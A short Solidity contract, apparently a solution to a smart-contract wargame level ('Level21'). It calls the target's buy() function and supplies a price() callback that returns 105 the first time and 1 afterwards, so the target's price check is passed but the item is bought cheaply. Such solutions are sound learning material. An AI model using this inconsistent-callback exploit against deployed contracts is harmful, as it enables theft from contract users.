// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level21.sol";

contract Level21Attacker {
  bool public hasBeenCalled = false;
  Level21 level21;

  constructor(address _level21) {
    level21 = Level21(_level21);
  }

  function attack() external {
    level21.buy();
  }

  function price() external returns (uint) {
    if(hasBeenCalled) {
      return 1;
    }
    hasBeenCalled = true;
    return 105;
  }
}